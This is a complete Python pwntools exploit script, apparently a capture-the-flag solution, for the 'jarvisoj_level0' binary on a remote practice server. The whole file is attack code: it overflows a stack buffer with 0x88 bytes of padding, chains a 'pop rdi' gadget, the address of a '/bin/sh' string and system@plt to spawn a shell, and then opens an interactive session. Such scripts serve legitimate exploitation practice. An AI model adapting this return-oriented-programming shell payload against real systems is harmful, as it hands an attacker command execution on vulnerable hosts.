#!/usr/bin/python3.6
from pwn import *

elf = ELF("./jarvisoj_level0")
# proc = process("./jarvisoj_level0")
proc = remote("node3.buuoj.cn", 26872)

# ROPgadget --binary jarvisoj_level0 --only 'pop|ret'
pop_rdi = 0x0000000000400663
# ROPgadget --binary jarvisoj_level0 --string '/bin/sh'
str_bin_sh = 0x0000000000400684
system_plt = elf.sym['system']

payload = b'i' * 0x88 + p64(pop_rdi) + p64(str_bin_sh) + p64(system_plt)

proc.sendline(payload)
proc.interactive()
